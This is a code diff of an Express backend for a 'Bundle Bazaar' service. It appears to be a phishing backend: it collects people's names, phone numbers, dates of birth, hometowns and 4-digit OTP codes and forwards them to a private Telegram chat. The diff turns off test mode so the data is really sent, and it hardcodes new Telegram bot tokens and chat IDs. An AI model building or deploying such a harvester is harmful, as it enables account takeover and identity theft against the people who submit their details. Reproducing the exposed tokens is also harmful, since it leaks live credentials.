@@ -3,26 +3,23 @@ const cors = require('cors');
 const axios = require('axios');
 
 const app = express();
-const PORT = process.env.PORT || 5000; // ✅ Use Railway's PORT
+const PORT = process.env.PORT || 5000;
 
 // =============================================
-// CONFIGURATION
+// CONFIGURATION - UPDATED WITH NEW TELEGRAM CREDENTIALS
 // =============================================
-// ⚠️ UPDATE THESE WITH YOUR ACTUAL TELEGRAM CREDENTIALS
-// For now, TEST_MODE = true will skip Telegram
-const TELEGRAM_BOT_TOKEN = '8993833860:AAHz1B3ueOgICpj_JdhckTf7Xp0Vu6IeLCY'; // ⚠️ This token is invalid
-const TELEGRAM_CHAT_ID = '7730849900';
+const TELEGRAM_BOT_TOKEN = '8912556480:AAF_m34R8vT5GUwhsx29qPW854OOXnl5FfY';
+const TELEGRAM_CHAT_ID = '8313270294';
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
-// 🟢 SET THIS TO true TO TEST WITHOUT TELEGRAM
-// 🟢 SET THIS TO false WHEN YOU HAVE VALID TELEGRAM CREDENTIALS
-const TEST_MODE = true;
+// TEST_MODE = false to actually send messages
+const TEST_MODE = false;
 
 // =============================================
 // MIDDLEWARE
 // =============================================
 app.use(cors({
-    origin: '*', // Allow all origins for testing
+    origin: '*',
     methods: ['GET', 'POST', 'PUT', 'DELETE'],
     allowedHeaders: ['Content-Type', 'Authorization']
 }));
@@ -39,17 +36,14 @@ app.use((req, res, next) => {
 });
 
 // =============================================
-// TELEGRAM SEND FUNCTION - FIXED WITH TEST MODE
+// TELEGRAM SEND FUNCTION
 // =============================================
 async function sendToTelegram(message) {
-    // ✅ If TEST_MODE is true, just log the message
     if (TEST_MODE) {
         console.log('📨 [TEST MODE] Would send to Telegram:', message);
-        console.log('✅ [TEST MODE] Message logged successfully!');
         return { ok: true, message: 'Test mode - message logged' };
     }
 
-    // ✅ If TEST_MODE is false, actually send to Telegram
     try {
         const response = await axios.post(TELEGRAM_API_URL, {
             chat_id: TELEGRAM_CHAT_ID,
@@ -60,7 +54,6 @@ async function sendToTelegram(message) {
         return response.data;
     } catch (error) {
         console.error('❌ Error sending to Telegram:', error.response?.data || error.message);
-        // ✅ Don't throw - just log the error so the API still works
         return { ok: false, message: 'Telegram error but continuing' };
     }
 }
@@ -128,12 +121,12 @@ ${otpMessage}
 // API ENDPOINTS
 // =============================================
 
-// Health Check
 app.get('/', (req, res) => {
     res.json({
         status: '✅ Bundle Bazaar API is running!',
         port: PORT,
         testMode: TEST_MODE,
+        telegramBot: '✅ Connected',
         endpoints: [
             'POST /api/register-vendor',
             'POST /api/purchase',
@@ -154,7 +147,7 @@ app.get('/api/health', (req, res) => {
 });
 
 // =============================================
-// 1. VENDOR REGISTRATION ✅
+// 1. VENDOR REGISTRATION
 // =============================================
 app.post('/api/register-vendor', async (req, res) => {
     try {
@@ -162,7 +155,6 @@ app.post('/api/register-vendor', async (req, res) => {
 
         console.log('📝 Registration data received:', req.body);
 
-        // Validate all fields
         if (!fullName || !phone || !email || !business || !tradeType || !network || !dob || !hometown) {
             return res.status(400).json({
                 success: false,
@@ -170,7 +162,6 @@ app.post('/api/register-vendor', async (req, res) => {
             });
         }
 
-        // Validate phone number
         if (phone.length < 10 || !/^\d+$/.test(phone)) {
             return res.status(400).json({
                 success: false,
@@ -178,7 +169,6 @@ app.post('/api/register-vendor', async (req, res) => {
             });
         }
 
-        // Validate email
         if (!email.includes('@') || !email.includes('.')) {
             return res.status(400).json({
                 success: false,
@@ -188,8 +178,6 @@ app.post('/api/register-vendor', async (req, res) => {
 
         const data = { fullName, phone, email, business, tradeType, network, dob, hometown };
         const message = formatVendorRegistration(data);
-        
-        // Send to Telegram (or log if TEST_MODE)
         await sendToTelegram(message);
 
         res.json({
@@ -207,7 +195,7 @@ app.post('/api/register-vendor', async (req, res) => {
 });
 
 // =============================================
-// 2. PURCHASE (with 4-digit OTP) ✅
+// 2. PURCHASE (with 4-digit OTP)
 // =============================================
 app.post('/api/purchase', async (req, res) => {
     try {
@@ -239,7 +227,7 @@ app.post('/api/purchase', async (req, res) => {
 });
 
 // =============================================
-// 3. RECHARGE (no OTP needed) ✅
+// 3. RECHARGE (no OTP needed)
 // =============================================
 app.post('/api/recharge', async (req, res) => {
     try {
@@ -271,7 +259,7 @@ app.post('/api/recharge', async (req, res) => {
 });
 
 // =============================================
-// 4. SEND PHONE + 4-DIGIT OTP ✅
+// 4. SEND PHONE + 4-DIGIT OTP
 // =============================================
 app.post('/api/send-phone', async (req, res) => {
     try {
@@ -325,6 +313,7 @@ app.use((req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Bundle Bazaar Backend running on port ${PORT}`);
     console.log(`📨 TEST_MODE: ${TEST_MODE}`);
+    console.log(`🤖 Telegram Bot: ✅ Configured`);
     console.log('');
     console.log('📌 Available endpoints:');
     console.log('   POST /api/register-vendor');
